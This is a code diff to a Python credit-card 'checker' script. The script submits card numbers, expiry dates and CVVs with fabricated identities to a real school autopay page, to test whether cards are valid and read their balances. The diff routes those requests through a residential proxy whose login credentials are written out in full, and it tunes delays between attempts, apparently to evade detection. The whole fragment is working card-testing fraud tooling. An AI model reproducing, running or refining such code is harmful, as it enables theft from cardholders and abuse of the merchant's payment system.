@@ -155,7 +155,7 @@ def saldo(card, month, year, cvv):
             
             if len(year) == 4:
                 year = year[2:]
-                
+            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'} 
             url = "https://www.eduwhere.com/secure/autopay_confirm.php"
             payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
             headers = {
@@ -164,7 +164,7 @@ def saldo(card, month, year, cvv):
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
             if 'ssl_account_balance' in response.text:
                 dolar = pegarItem(response.text, '&amp;ssl_account_balance=','&')
                 return dolar
@@ -183,7 +183,7 @@ def saldo(card, month, year, cvv):
     
     
 def checker(card, month, year, cvv):
-    time.sleep(6)
+    time.sleep(5)
     try:
         url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
         headers = {
@@ -345,7 +345,7 @@ def checker(card, month, year, cvv):
             elapsed_time = time.time() - start_time
             MSegundos = round(elapsed_time, 2)
             
-
+            time.sleep(3)
             if 'Insufficient funds' in response.text:
                 dolar = saldo(card, month, year, cvv)
                 bin = api_bin(card[:6])              
